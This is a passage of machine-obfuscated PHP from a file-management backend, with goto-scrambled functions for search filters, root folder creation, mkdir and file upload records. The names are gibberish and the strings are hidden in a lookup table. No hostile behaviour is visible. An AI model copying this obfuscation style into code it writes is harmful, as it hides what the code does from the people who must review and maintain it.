$cŠ¹ë¤ÈÅÅ = Model($a„ƒçŞ£·•[423])->field($a„ƒçŞ£·•[85])->where($d‡‚×…ÈŒ´)->select(); goto dÃ‡±âÁÒ; dÃ‡±âÁÒ: $cŠ¹ë¤ÈÅÅ = array_to_keyvalue($cŠ¹ë¤ÈÅÅ, $a„ƒçŞ£·•[43], $a„ƒçŞ£·•[85]); $Eƒô³é‡ùá = array_unique($cŠ¹ë¤ÈÅÅ); $this->_listSearchMerge($BšÅ¦Á¯†Î, $f¤ŒØÅ³¢¬, $CöŸºÓ‚°, $Eƒô³é‡ùá); goto FÌÉ«ê×´¬; cØ«©âÜß™: $a„ƒçŞ£·• =& $_SERVER[¾÷]; if (!$f¤ŒØÅ³¢¬[$a„ƒçŞ£·•[1752]] || $BšÅ¦Á¯†Î[$a„ƒçŞ£·•[371]][$a„ƒçŞ£·•[358]] > 1 || !$f¤ŒØÅ³¢¬[$a„ƒçŞ£·•[481]]) { return; } $eæ–ì‘Û£Ø = $this->sourceInfo($f¤ŒØÅ³¢¬[$a„ƒçŞ£·•[481]]); goto dçŒ«Œ»¸; FÌÉ«ê×´¬: } private function _listSearchMerge(&$dØ½È›Š¸, $fá•Å«Îâ‡, $AÎß‡—Œïî, $F²È˜™…Ñ) { goto DÃÜ”ƒ•æË; F·İÇÌŸêÒ: foreach ($b¤ôŞÑÙ as $F÷ø‡é‰¬) { if ($this->_listSearchFilter($F÷ø‡é‰¬, $fá•Å«Îâ‡)) { $EãÍòÕ÷¡[] = $F÷ø‡é‰¬; } } $dØ½È›Š¸[$C“•†áØ§£[374]] = array_merge($EãÍòÕ÷¡, $dØ½È›Š¸[$C“•†áØ§£[374]]); $dØ½È›Š¸[$C“•†áØ§£[371]][$C“•†áØ§£[372]] += count($EãÍòÕ÷¡); goto d°¨öåŒÆ—; fˆñ‚ÊÏ§š: $d«ğ¿Ì¿İ÷ = array_diff($F²È˜™…Ñ, $bøè¨ŒáØÈ); if (!$d«ğ¿Ì¿İ÷) { return; } $Eƒ†ŠÕÅ« = array($C“•†áØ§£[399] => array($C“•†áØ§£[17], $d«ğ¿Ì¿İ÷)); goto aÕä¯’ŒÕ‹; aÕä¯’ŒÕ‹: $b¤ôŞÑÙ = $this->field($AÎß‡—Œïî)->where($Eƒ†ŠÕÅ«)->select(); if (!$b¤ôŞÑÙ) { return; } $EãÍòÕ÷¡ = array(); goto F·İÇÌŸêÒ; DÃÜ”ƒ•æË: $C“•†áØ§£ =& $_SERVER[¾÷]; if (!$F²È˜™…Ñ) { return; } $bøè¨ŒáØÈ = array_to_keyvalue($dØ½È›Š¸[$C“•†áØ§£[374]], $C“•†áØ§£[43], $C“•†áØ§£[399]); goto fˆñ‚ÊÏ§š; d°¨öåŒÆ—: } private function _listSearchFilter($d¢ø°Úã•, $b«Œê·ä“Æ) { goto c¸æĞÙ¼â†; DÁîì˜ï: if (isset($b«Œê·ä“Æ[$AåÍÌùÆ¯[408]]) && $b«Œê·ä“Æ[$AåÍÌùÆ¯[408]] != $AåÍÌùÆ¯[1719]) { if ($b«Œê·ä“Æ[$AåÍÌùÆ¯[408]] == $AåÍÌùÆ¯[86] && !$eÇÁ•«‹Û´) { return !1; } if ($b«Œê·ä“Æ[$AåÍÌùÆ¯[408]] != $AåÍÌùÆ¯[86] && $eÇÁ•«‹Û´) { return !1; } if (!strstr($d¢ø°Úã•[$AåÍÌùÆ¯[177]], $AåÍÌùÆ¯[57] . $b«Œê·ä“Æ[$AåÍÌùÆ¯[408]] . $AåÍÌùÆ¯[57])) { return !1; } } if (isset($b«Œê·ä“Æ[$AåÍÌùÆ¯[1914]]) && $b«Œê·ä“Æ[$AåÍÌùÆ¯[1914]] < $d¢ø°Úã•[$AåÍÌùÆ¯[87]]) { return !1; } if (isset($b«Œê·ä“Æ[$AåÍÌùÆ¯[1915]]) && $b«Œê·ä“Æ[$AåÍÌùÆ¯[1915]] > $d¢ø°Úã•[$AåÍÌùÆ¯[87]]) { return !1; } goto Cõ®ŒÃ­¥Ö; Cõ®ŒÃ­¥Ö: if (isset($b«Œê·ä“Æ[$AåÍÌùÆ¯[566]]) && $b«Œê·ä“Æ[$AåÍÌùÆ¯[566]] != $d¢ø°Úã•[$AåÍÌùÆ¯[437]]) { return !1; } return !0; goto FÕÚóšë·¿; c¸æĞÙ¼â†: $AåÍÌùÆ¯ =& $_SERVER[¾÷]; $eÇÁ•«‹Û´ = $d¢ø°Úã•[$AåÍÌùÆ¯[406]] == $AåÍÌùÆ¯[96]; if (!strstr($d¢ø°Úã•[$AåÍÌùÆ¯[490]], $AåÍÌùÆ¯[57] . $b«Œê·ä“Æ[$AåÍÌùÆ¯[481]] . $AåÍÌùÆ¯[57])) { return !1; } goto DÁîì˜ï; FÕÚóšë·¿: } public function listSearchChildren($dñ½óÖ²Úæ, $Bôö„Âø¿ = 5000) { goto F×íêèÙ•·; F×íêèÙ•·: $D¹æÙË‹†ß =& $_SERVER[¾÷]; $e‹‹ñœˆâ” = array(); $bÆç¹ïãŠ‘ = $this->sourceInfo($dñ½óÖ²Úæ); goto EŞ×Ö‡Š¯ï; bˆùÕØŸ®: $c¹â‡˜íÚÎ = $this->field($D¹æÙË‹†ß[399])->where($e·â‹İ“¨Ø)->select(); $e‹‹ñœˆâ” = array_to_keyvalue($c¹â‡˜íÚÎ, $D¹æÙË‹†ß[43], $D¹æÙË‹†ß[399]); return $e‹‹ñœˆâ”; goto B÷ŸÓš†; EŞ×Ö‡Š¯ï: $e·â‹İ“¨Ø = array($D¹æÙË‹†ß[490] => array($D¹æÙË‹†ß[387], $bÆç¹ïãŠ‘[$D¹æÙË‹†ß[490]] . $bÆç¹ïãŠ‘[$D¹æÙË‹†ß[399]] . $D¹æÙË‹†ß[517])); $A†Š©Ø¬† = $this->field($D¹æÙË‹†ß[399])->cache(null, 600)->where($e·â‹İ“¨Ø)->count(); if ($A†Š©Ø¬† > $Bôö„Âø¿) { return $this->_listSearchChildrenNear($dñ½óÖ²Úæ, $Bôö„Âø¿); } goto bˆùÕØŸ®; B÷ŸÓš†: } private function _listSearchChildrenNear($DîÔğŠîÁ•, $E•óÊ¯¿ö) { goto AÏ§§ï°ñí; aÂØÌ²îÒó: if (!$aÍŠñÛ ×–) { return $f¬‰’¼¡Ìš; } $c™Ç«’œ”÷ = array($c‰•çÌ¡ç¥[481] => array($c‰•çÌ¡ç¥[17], $aÍŠñÛ ×–)); $CŞŠ£„£¢ = $this->field($c‰•çÌ¡ç¥[1916])->where($c™Ç«’œ”÷)->limit($E•óÊ¯¿ö)->select(); goto C—‚µ¹‡è; b–¥¢Â¡§: $CŞŠ£„£¢ = $this->field($c‰•çÌ¡ç¥[1916])->where($c™Ç«’œ”÷)->select(); $aÍŠñÛ ×– = array_to_keyvalue(array_filter_by_field($CŞŠ£„£¢, $c‰•çÌ¡ç¥[406], $c‰•çÌ¡ç¥[96]), $c‰•çÌ¡ç¥[43], $c‰•çÌ¡ç¥[399]); $f¬‰’¼¡Ìš = array_merge($f¬‰’¼¡Ìš, array_to_keyvalue($CŞŠ£„£¢, $c‰•çÌ¡ç¥[43], $c‰•çÌ¡ç¥[399])); goto aÂØÌ²îÒó; C—‚µ¹‡è: $f¬‰’¼¡Ìš = array_merge($f¬‰’¼¡Ìš, array_to_keyvalue($CŞŠ£„£¢, $c‰•çÌ¡ç¥[43], $c‰•çÌ¡ç¥[399])); $f¬‰’¼¡Ìš = array_slice($f¬‰’¼¡Ìš, 0, $E•óÊ¯¿ö); return $f¬‰’¼¡Ìš; goto fÚÇ¨õ»ù; AÏ§§ï°ñí: $c‰•çÌ¡ç¥ =& $_SERVER[¾÷]; $f¬‰’¼¡Ìš = array(); $c™Ç«’œ”÷ = array($c‰•çÌ¡ç¥[481] => $DîÔğŠîÁ•); goto b–¥¢Â¡§; fÚÇ¨õ»ù: } private function _listSearchBindPinyin($b›©ÙÉ¹Ù, &$bÕ¤ŸÕºÃ, &$DÓÂñäæ‰é) { goto Eê”Ù­óĞÌ; b¾ŒÍ·ª¬Ë: $bÕ¤ŸÕºÃ = $bÛ‘‚ÔÁ¥î; goto B„šæ†‹£; bŸàŒï»†„: foreach ($bÕ¤ŸÕºÃ as $cÀÃì¶ˆ‰™ => $E™´¬¢§˜ö) { $bÛ‘‚ÔÁ¥î[$Eáç³İ”õ[1918] . $cÀÃì¶ˆ‰™] = $E™´¬¢§˜ö; } foreach ($b«¢š«í¼ as $añĞ††°İ‘) { $bÛ‘‚ÔÁ¥î[] = array($Eáç³İ”õ[1920] => $añĞ††°İ‘, $Eáç³İ”õ[934] => $Eáç³İ”õ[1756], array($Eáç³İ”õ[1921] => $añĞ††°İ‘, $Eáç³İ”õ[1922] => array($Eáç³İ”õ[17], array($Eáç³İ”õ[447], $Eáç³İ”õ[446])))); } $this->join($eùÌŒ¦ù·); goto b¾ŒÍ·ª¬Ë; bÏèá¿ä–: $DÓÂñäæ‰é = $Eáç³İ”õ[1918] . str_replace($Eáç³İ”õ[57], $Eáç³İ”õ[1919], $DÓÂñäæ‰é); $b«¢š«í¼ = $bÕ¤ŸÕºÃ[$Eáç³İ”õ[38]]; unset($bÕ¤ŸÕºÃ[$Eáç³İ”õ[38]]); goto bŸàŒï»†„; e–®–ˆÕøœ: $eùÌŒ¦ù· = "\x4c\x45\106\x54\x20\112\x4f\x49\x4e\40{$this->tablePrefix}\x69\157\137\163\x6f\x75\x72\x63\x65\137\x6d\x65\164\x61\40\x6d\x65\x74\141\40\x6f\156\x20\163\x6f\x75\x72\143\x65\56\x73\157\165\162\143\x65\x49\104\x20\75\40\155\145\164\x61\x2e\163\x6f\165\162\143\x65\111\104"; $bÛ‘‚ÔÁ¥î = array(); $DÓÂñäæ‰é = str_replace(array($Eáç³İ”õ[9], $Eáç³İ”õ[60], $Eáç³İ”õ[1917]), $Eáç³İ”õ[43], $DÓÂñäæ‰é); goto bÏèá¿ä–; Eê”Ù­óĞÌ: $Eáç³İ”õ =& $_SERVER[¾÷]; if (!isset($b›©ÙÉ¹Ù[$Eáç³İ”õ[1752]]) || !$b›©ÙÉ¹Ù[$Eáç³İ”õ[1752]]) { return; } if (!Input::check($b›©ÙÉ¹Ù[$Eáç³İ”õ[1752]], $Eáç³İ”õ[323]) || strlen($b›©ÙÉ¹Ù[$Eáç³İ”õ[1752]]) < 2) { return; } goto e–®–ˆÕøœ; B„šæ†‹£: } private function _parseSearchWhere($Dî‰‚æà) { goto D—¦ªÎ…†¦; bÛ„À‘Ÿó: if (isset($Dî‰‚æà[$AèŒ­œÁ÷[1752]]) && trim($Dî‰‚æà[$AèŒ­œÁ÷[1752]])) { $D‡ÚŒ®›Áå = trim($Dî‰‚æà[$AèŒ­œÁ÷[1752]]); $a‚í¡ÓÌ’ë = explode($AèŒ­œÁ÷[60], $D‡ÚŒ®›Áå); if (strlen($D‡ÚŒ®›Áå) > 2 && (substr($D‡ÚŒ®›Áå, 0, 1) == $AèŒ­œÁ÷[125] && substr($D‡ÚŒ®›Áå, -1) == $AèŒ­œÁ÷[125]) || substr($D‡ÚŒ®›Áå, 0, 1) == $AèŒ­œÁ÷[65] && substr($D‡ÚŒ®›Áå, -1) == $AèŒ­œÁ÷[65]) { $D‡ÚŒ®›Áå = substr($D‡ÚŒ®›Áå, 1, -1); $a‚í¡ÓÌ’ë = array($D‡ÚŒ®›Áå); } $c‚¦ÊŠÔ‰¦[$AèŒ­œÁ÷[38]] = array(array($AèŒ­œÁ÷[516], $AèŒ­œÁ÷[1754] . $D‡ÚŒ®›Áå . $AèŒ­œÁ÷[1754])); if (count($a‚í¡ÓÌ’ë) > 1) { $c‚¦ÊŠÔ‰¦[$AèŒ­œÁ÷[38]] = array(); foreach ($a‚í¡ÓÌ’ë as $F×ÛÄéß´›) { if (!trim($F×ÛÄéß´›)) { continue; } $c‚¦ÊŠÔ‰¦[$AèŒ­œÁ÷[38]][] = array($AèŒ­œÁ÷[516], $AèŒ­œÁ÷[1754] . trim($F×ÛÄéß´›) . $AèŒ­œÁ÷[1754]); } } } return $c‚¦ÊŠÔ‰¦; goto f¢Ï¯ä¬èÕ; C´‹ëøëù: if (isset($Dî‰‚æà[$AèŒ­œÁ÷[479]]) && $Dî‰‚æà[$AèŒ­œÁ÷[479]]) { $d’ƒ«ŸŒù¸ = array($AèŒ­œÁ÷[1924], $Dî‰‚æà[$AèŒ­œÁ÷[479]]); if ($c‚¦ÊŠÔ‰¦[$AèŒ­œÁ÷[93]]) { $c‚¦ÊŠÔ‰¦[$AèŒ­œÁ÷[93]] = array($c‚¦ÊŠÔ‰¦[$AèŒ­œÁ÷[93]], $d’ƒ«ŸŒù¸, $AèŒ­œÁ÷[1925]); } else { $c‚¦ÊŠÔ‰¦[$AèŒ­œÁ÷[93]] = $d’ƒ«ŸŒù¸; } } if (isset($Dî‰‚æà[$AèŒ­œÁ÷[1914]]) && $Dî‰‚æà[$AèŒ­œÁ÷[1914]] > 0) { $c‚¦ÊŠÔ‰¦[$AèŒ­œÁ÷[87]] = array($AèŒ­œÁ÷[1923], $Dî‰‚æà[$AèŒ­œÁ÷[1914]]); } if (isset($Dî‰‚æà[$AèŒ­œÁ÷[1915]]) && $Dî‰‚æà[$AèŒ­œÁ÷[1915]]) { $d’ƒ«ŸŒù¸ = array($AèŒ­œÁ÷[1924], $Dî‰‚æà[$AèŒ­œÁ÷[1915]]); if ($c‚¦ÊŠÔ‰¦[$AèŒ­œÁ÷[87]]) { $c‚¦ÊŠÔ‰¦[$AèŒ­œÁ÷[87]] = array($c‚¦ÊŠÔ‰¦[$AèŒ­œÁ÷[87]], $d’ƒ«ŸŒù¸, $AèŒ­œÁ÷[1925]); } else { $c‚¦ÊŠÔ‰¦[$AèŒ­œÁ÷[87]] = $d’ƒ«ŸŒù¸; } } goto dğÌˆˆ¸ã±; dğÌˆˆ¸ã±: if (isset($Dî‰‚æà[$AèŒ­œÁ÷[566]]) && $Dî‰‚æà[$AèŒ­œÁ÷[566]]) { $c‚¦ÊŠÔ‰¦[] = array($AèŒ­œÁ÷[437] => $Dî‰‚æà[$AèŒ­œÁ÷[566]], $AèŒ­œÁ÷[435] => $Dî‰‚æà[$AèŒ­œÁ÷[566]], $AèŒ­œÁ÷[934] => $AèŒ­œÁ÷[1756]); } if (isset($Dî‰‚æà[$AèŒ­œÁ÷[408]]) && $Dî‰‚æà[$AèŒ­œÁ÷[408]]) { $e’§¾’Š¤Û = $Dî‰‚æà[$AèŒ­œÁ÷[408]]; if ($e’§¾’Š¤Û == $AèŒ­œÁ÷[86]) { $c‚¦ÊŠÔ‰¦[$AèŒ­œÁ÷[406]] = 1; } else { if ($e’§¾’Š¤Û == $AèŒ­œÁ÷[1926]) { $c‚¦ÊŠÔ‰¦[$AèŒ­œÁ÷[406]] = 0; } else { if ($e’§¾’Š¤Û) { $e’§¾’Š¤Û = is_array($e’§¾’Š¤Û) ? $e’§¾’Š¤Û : explode($AèŒ­œÁ÷[57], $e’§¾’Š¤Û); $c‚¦ÊŠÔ‰¦[$AèŒ­œÁ÷[408]] = array($AèŒ­œÁ÷[414], $e’§¾’Š¤Û); $c‚¦ÊŠÔ‰¦[$AèŒ­œÁ÷[406]] = 0; } } } } if (isset($Dî‰‚æà[$AèŒ­œÁ÷[481]]) && $Dî‰‚æà[$AèŒ­œÁ÷[481]]) { $e¬ÈùÈÍÊİ = $this->sourceInfo($Dî‰‚æà[$AèŒ­œÁ÷[481]]); $c‚¦ÊŠÔ‰¦[$AèŒ­œÁ÷[557]] = array($AèŒ­œÁ÷[516], $e¬ÈùÈÍÊİ[$AèŒ­œÁ÷[490]] . $Dî‰‚æà[$AèŒ­œÁ÷[481]] . $AèŒ­œÁ÷[517]); } goto bÛ„À‘Ÿó; D—¦ªÎ…†¦: $AèŒ­œÁ÷ =& $_SERVER[¾÷]; $c‚¦ÊŠÔ‰¦ = array(); if (isset($Dî‰‚æà[$AèŒ­œÁ÷[724]]) && $Dî‰‚æà[$AèŒ­œÁ÷[724]]) { $c‚¦ÊŠÔ‰¦[$AèŒ­œÁ÷[93]] = array($AèŒ­œÁ÷[1923], $Dî‰‚æà[$AèŒ­œÁ÷[724]]); } goto C´‹ëøëù; f¢Ï¯ä¬èÕ: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($BĞò’éáÑõ) { $F·¡…ŠœÀ¥ =& $_SERVER[¾÷]; $cÕæÖÉÆÕĞ = Model($F·¡…ŠœÀ¥[506])->where(array($F·¡…ŠœÀ¥[1497] => $BĞò’éáÑõ))->find(); $F¥™˜Íæ« = $this->_mkdirRoot(SourceModel::TYPE_USER, $BĞò’éáÑõ, $cÕæÖÉÆÕĞ[$F·¡…ŠœÀ¥[38]]); $this->userDesktopAdd($F¥™˜Íæ«); return $F¥™˜Íæ«; } public function userDesktopAdd($aœÈÁ–£¿á) { $F¡ë¯ò—Ò¬ =& $_SERVER[¾÷]; $dÄ„ˆŞÃË¿ = LNG($F¡ë¯ò—Ò¬[1927]); $F£˜­†µÙ = $this->mkdir($aœÈÁ–£¿á, $dÄ„ˆŞÃË¿); $this->metaSet($F£˜­†µÙ, $F¡ë¯ò—Ò¬[1928], $F¡ë¯ò—Ò¬[96]); $this->metaSet($aœÈÁ–£¿á, $F¡ë¯ò—Ò¬[1929], $F£˜­†µÙ); } public function groupRootAdd($eñË…”Ø¼×) { $a…ïŠ¿È• =& $_SERVER[¾÷]; $F¨œÍ…£¤ = Model($a…ïŠ¿È•[489])->where(array($a…ïŠ¿È•[1747] => $eñË…”Ø¼×))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $eñË…”Ø¼×, $F¨œÍ…£¤[$a…ïŠ¿È•[38]]); } public function systemRootPathAdd($EÚ¿—â‰“â) { if ($EÚ¿—â‰“â != $_SERVER[¾÷][509]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $EÚ¿—â‰“â); } public function userRootRemove($B£‡•µĞ·ò) { $CñïõÓ„¾ = $this->sourceRoot(SourceModel::TYPE_USER, $B£‡•µĞ·ò); if (!$CñïõÓ„¾) { return; } $this->remove($CñïõÓ„¾, !1); } public function groupRootRemove($DŒ¢©Ç†Â) { $eÉª«îè‘ø = $this->sourceRoot(SourceModel::TYPE_GROUP, $DŒ¢©Ç†Â); if (!$eÉª«îè‘ø) { return; } $this->remove($eÉª«îè‘ø, !1); } private function _mkdirRoot($BÛ„÷…, $eæ’¥©ÜĞ¶, $a‡ŒİÙ¯Éğ) { goto B¢«Ó¼ò£; cİÓ¼äïŸ¨: $f³ØëÕØæ¤ = "\115\157\x64\x65\x6c\123\157\x75\162\x63\x65\x2e\155\153\x64\x69\162\x52\157\157\164\56{$BÛ„÷…}\x2e{$eæ’¥©ÜĞ¶}\x2e" . $a‡ŒİÙ¯Éğ; CacheLock::lock($f³ØëÕØæ¤); $d´À„äè«Ê[$CôÎŒÅ‹…[38]] = $a‡ŒİÙ¯Éğ; goto E¯ëå¾‚ ­; E¯ëå¾‚ ­: $E¹ò æ•·Ù = $this->add($d´À„äè«Ê); $Bº¶ÍÃ½• = array($CôÎŒÅ‹…[559] => short_id($E¹ò æ•·Ù)); $this->where(array($CôÎŒÅ‹…[413] => $E¹ò æ•·Ù))->save($Bº¶ÍÃ½•); goto Cìä‘ŠÂß¿; B¢«Ó¼ò£: $CôÎŒÅ‹… =& $_SERVER[¾÷]; $d´À„äè«Ê = array($CôÎŒÅ‹…[398] => 0, $CôÎŒÅ‹…[553] => $BÛ„÷…, $CôÎŒÅ‹…[554] => $eæ’¥©ÜĞ¶, $CôÎŒÅ‹…[550] => 1, $CôÎŒÅ‹…[555] => USER_ID, $CôÎŒÅ‹…[556] => USER_ID, $CôÎŒÅ‹…[551] => $CôÎŒÅ‹…[43], $CôÎŒÅ‹…[557] => $CôÎŒÅ‹…[502], $CôÎŒÅ‹…[425] => 0, $CôÎŒÅ‹…[552] => 0, $CôÎŒÅ‹…[451] => 0, $CôÎŒÅ‹…[558] => $CôÎŒÅ‹…[43]); if ($Då£¼š‹‹å = $this->where($d´À„äè«Ê)->find()) { return $Då£¼š‹‹å[$CôÎŒÅ‹…[399]]; } goto cİÓ¼äïŸ¨; Cìä‘ŠÂß¿: CacheLock::unlock($f³ØëÕØæ¤); return $E¹ò æ•·Ù; goto EÚ×É¥ë‰î; EÚ×É¥ë‰î: } private function sourceRoot($Fš±„Œ¿½Ï, $Eˆ£‰«‘, $có†Âæ‡»‹ = false) { $E–ªÖŠ½ =& $_SERVER[¾÷]; $f¤Öôê²÷± = array($E–ªÖŠ½[398] => 0, $E–ªÖŠ½[553] => $Fš±„Œ¿½Ï, $E–ªÖŠ½[554] => $Eˆ£‰«‘); if ($cšëô¹ÄÊ´ = $this->where($f¤Öôê²÷±)->find()) { return $có†Âæ‡»‹ ? $cšëô¹ÄÊ´ : $cšëô¹ÄÊ´[$E–ªÖŠ½[399]]; } return !1; } public function sourceRootGroup($AÊÖé»¯ÔÔ) { goto B‹Ûô¶…Š; B›‚ÛÑ¿ˆÒ: $this->selectPageReset(); $aİçºëÇÕÙ = $this->listSource($E­½É†„ì“, 1000); $this->selectPageRestore(); goto B´Ù˜õ¨Ö›; B‹Ûô¶…Š: $ağÙƒ–°‘ =& $_SERVER[¾÷]; if (is_string($AÊÖé»¯ÔÔ)) { $AÊÖé»¯ÔÔ = array($AÊÖé»¯ÔÔ); } $E­½É†„ì“ = array($ağÙƒ–°‘[398] => 0, $ağÙƒ–°‘[553] => SourceModel::TYPE_GROUP, $ağÙƒ–°‘[554] => array($ağÙƒ–°‘[17], $AÊÖé»¯ÔÔ)); goto B›‚ÛÑ¿ˆÒ; B´Ù˜õ¨Ö›: return array_to_keyvalue($aİçºëÇÕÙ[$ağÙƒ–°‘[84]], $ağÙƒ–°‘[487]); goto cèÛ¾öÆöµ; cèÛ¾öÆöµ: } public function mkfile($cÍ¶Â‰Ô˜, $fŒİƒÒÄˆå, $e–åí ÔĞ = '', $f÷ÓĞÔÏ• = REPEAT_RENAME) { $e‘ñ½İ†» =& $_SERVER[¾÷]; $C‹ÖñŒÃ°Œ = Model($e‘ñ½İ†»[575])->addFileByContent($e–åí ÔĞ, $fŒİƒÒÄˆå); return $this->_createFileCall($cÍ¶Â‰Ô˜, $fŒİƒÒÄˆå, $C‹ÖñŒÃ°Œ, $f÷ÓĞÔÏ•, $e‘ñ½İ†»[1191]); } public function addFile($Bù¢­Ù’Ù‘, $aáÄ‡ùÂ©, $f§î¡óÔ¨Ö, $D„ÔÂù¢Æ½ = false, $cÂ¡øŠïë« = REPEAT_RENAME) { $dÉÎµ®À— = Model($_SERVER[¾÷][575])->addFile($aáÄ‡ùÂ©, $f§î¡óÔ¨Ö, $D„ÔÂù¢Æ½); return $this->_createFileCall($Bù¢­Ù’Ù‘, $f§î¡óÔ¨Ö, $dÉÎµ®À—, $cÂ¡øŠïë«); } public function addFileByFileID($Dƒ«Å¥ ÷¶, $b÷ÊÅÂˆØŞ, $f¯»Šëˆˆ, $AçŠçğ–¬ó = REPEAT_RENAME) { $eÏğÙ‰³¨ =& $_SERVER[¾÷]; $B²”×ğ·ÔÉ = Model($eÏğÙ‰³¨[575])->find($b÷ÊÅÂˆØŞ); Model($eÏğÙ‰³¨[575])->linkAdd($b÷ÊÅÂˆØŞ); return $this->_createFileCall($Dƒ«Å¥ ÷¶, $f¯»Šëˆˆ, $B²”×ğ·ÔÉ, $AçŠçğ–¬ó); } public function addFileByRemote($Dôä¨†£ˆ, $DšˆÌ¥¥Æ, $A™äöèøØŠ, $fÔõÃ¤Šó  = array(), $BØºˆè¥¤“ = REPEAT_RENAME) { $Fßğ°°¦À‹ = Model($_SERVER[¾÷][575])->addFileByRemote($DšˆÌ¥¥Æ, $A™äöèøØŠ, $fÔõÃ¤Šó ); return $this->_createFileCall($Dôä¨†£ˆ, $A™äöèøØŠ, $Fßğ°°¦À‹, $BØºˆè¥¤“); } private function _createFileCall($fá…òÂ¾ê, $f®¸ÙºÕ¾É, $dœëõ±¹Â‚, $F‡–µŒ£ğ†, $a¶­À§ÍÓ› = "\x75\160\x6c\157\141\144") { goto cƒ‹Û×´ó©; cƒ‹Û×´ó©: $Bƒöí‚Î³ =& $_SERVER[¾÷]; $C»„æ”Í‘ = !1; $this->lockWriteStart($fá…òÂ¾ê, $f®¸ÙºÕ¾É); goto B‚…—ˆ¤Á; B‚…—ˆ¤Á: $aíÖè©Èî = $this->fileNameExist($fá…òÂ¾ê, $f®¸ÙºÕ¾É); $eÊóº“©À« = $this->_createFile($fá…òÂ¾ê, $f®¸ÙºÕ¾É, $dœëõ±¹Â‚, $F‡–µŒ£ğ†, $C»„æ”Í‘); if (!$C»„æ”Í‘) { Model($Bƒöí‚Î³[453])->remove($dœëõ±¹Â‚[$Bƒöí‚Î³[450]]); } goto a®õâÉ‘ÓÙ; a®õâÉ‘ÓÙ: if ($C»„æ”Í‘ && $eÊóº“©À« && $eÊóº“©À« != $aíÖè©Èî) { Model($Bƒöí‚Î³[1899])->eventCreate($eÊóº“©À«, $a¶­À§ÍÓ›); } $this->lockWriteEnd($fá…òÂ¾ê, $f®¸ÙºÕ¾É); return $eÊóº“©À«; goto Eºô…ˆ¨ŸÚ; Eºô…ˆ¨ŸÚ: } public function mkdir($d’é‡âëçº, $Cè’±“ÕÛ¨, $a¸ˆ÷£†‚ó = REPEAT_SKIP) { goto BƒÁ“…; Fæ²Í½ô½ù: return $E´åÏ“×é; goto bÔù·§Çø‡; DƒÇîç—áË: $E´åÏ“×é = $this->_addSoure($AÙä‰¡–ˆ’, $EŞöº¬»Ü); Model($F„ğêĞ¯é[1899])->eventCreate($E´åÏ“×é, $F„ğêĞ¯é[1192]); $this->lockWriteEnd($d’é‡âëçº, $Cè’±“ÕÛ¨); goto Fæ²Í½ô½ù; cŸ”•äëåÉ: $this->lockWriteStart($d’é‡âëçº, $Cè’±“ÕÛ¨); if ($a¸ˆ÷£†‚ó !== !1) { $AĞßù’ºÈÎ = $this->fileNameExist($d’é‡âëçº, $Cè’±“ÕÛ¨); if ($AĞßù’ºÈÎ && $a¸ˆ÷£†‚ó != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($d’é‡âëçº, $Cè’±“ÕÛ¨); return $AĞßù’ºÈÎ; } $Cè’±“ÕÛ¨ = $this->fileNameAuto($d’é‡âëçº, $Cè’±“ÕÛ¨, $a¸ˆ÷£†‚ó); } $AÙä‰¡–ˆ’ = array($F„ğêĞ¯é[550] => 1, $F„ğêĞ¯é[416] => $Cè’±“ÕÛ¨, $F„ğêĞ¯é[551] => $F„ğêĞ¯é[43], $F„ğêĞ¯é[451] => 0, $F„ğêĞ¯é[552] => 0); goto DƒÇîç—áË; BƒÁ“…: $F„ğêĞ¯é =& $_SERVER[¾÷]; $EŞöº¬»Ü = $this->sourceInfo($d’é‡âëçº); if (!$EŞöº¬»Ü) { return !1; } goto cŸ”•äëåÉ; bÔù·§Çø‡: } private function _createFile($aáÄÆµêÑ, $BôôÅ·œ‚ƒ, $B˜—’øÔ, $f³§è¬ä•Î, &$bÓ®”àƒÈ“) { goto dŒ·ÄŸàëŠ; bç¼©ÙŞÚ: if ($f³§è¬ä•Î !== !1) { $b¾”©ÛÒ = $this->fileNameExist($aáÄÆµêÑ, $BôôÅ·œ‚ƒ); } $bÓ®”àƒÈ“ = !0; if ($f³§è¬ä•Î && $b¾”©ÛÒ) { if ($f³§è¬ä•Î == REPEAT_SKIP) { $bÓ®”àƒÈ“ = !1; return $b¾”©ÛÒ; } else { if ($f³§è¬ä•Î == REPEAT_REPLACE) { $EßàÔÆ¢”² = $this->sourceInfo($b¾”©ÛÒ); $Bòçñ„ğøä = $this->fileHistory($EßàÔÆ¢”², $B˜—’øÔ[$B“ã¹•ã†¾[450]], $B˜—’øÔ[$B“ã¹•ã†¾[87]]); if (!$Bòçñ„ğøä) { $bÓ®”àƒÈ“ = !1; } else { $this->folderSizeReset($aáÄÆµêÑ); } return $b¾”©ÛÒ; } else { $BôôÅ·œ‚ƒ = $this->fileNameAuto($aáÄÆµêÑ, $BôôÅ·œ‚ƒ, $f³§è¬ä•Î, !1); } } } goto EÅ…¨´áÌÍ; dŒ·ÄŸàëŠ: $B“ã¹•ã†¾ =& $_SERVER[¾÷]; $e›ïÛ»¢ = $this->sourceInfo($aáÄÆµêÑ); if (!$B˜—’øÔ || !$e›ïÛ»¢) { return !1; } goto bç¼©ÙŞÚ; Eô´¦Ÿª¾â: return $bç‡ğ¯Œ·ï; goto F‡êÀ¿Ş‹; EÅ…¨´áÌÍ: $EÜ÷¤—Ôé = array($B“ã¹•ã†¾[550] => 0, $B“ã¹•ã†¾[416] => $BôôÅ·œ‚ƒ, $B“ã¹•ã†¾[551] => get_path_ext($BôôÅ·œ‚ƒ), $B“ã¹•ã†¾[451] => $B˜—’øÔ[$B“ã¹•ã†¾[450]], $B“ã¹•ã†¾[552] => $B˜—’øÔ[$B“ã¹•ã†¾[87]]); $bç‡ğ¯Œ·ï = $this->_addSoure($EÜ÷¤—Ôé, $e›ïÛ»¢); $this->folderSizeReset($aáÄÆµêÑ, intval($EÜ÷¤—Ôé[$B“ã¹•ã†¾[87]])); goto Eô´¦Ÿª¾â; F‡êÀ¿Ş‹: } protected function fileHistory($e½äğàÁŒ–, $Dğğ¹ƒ¼Š, $Aî¬î”ğ) { goto bîœ»ÑèÛ–; bîœ»ÑèÛ–: $E’äÔõ³‘ =& $_SERVER[¾÷]; if ($e½äğàÁŒ–[$E’äÔõ³‘[450]] == $Dğğ¹ƒ¼Š) { return !1; } $this->checkLock($e½äğàÁŒ–[$E’äÔõ³‘[399]], $Dğğ¹ƒ¼Š); goto E±òÖ²°ÙÅ; 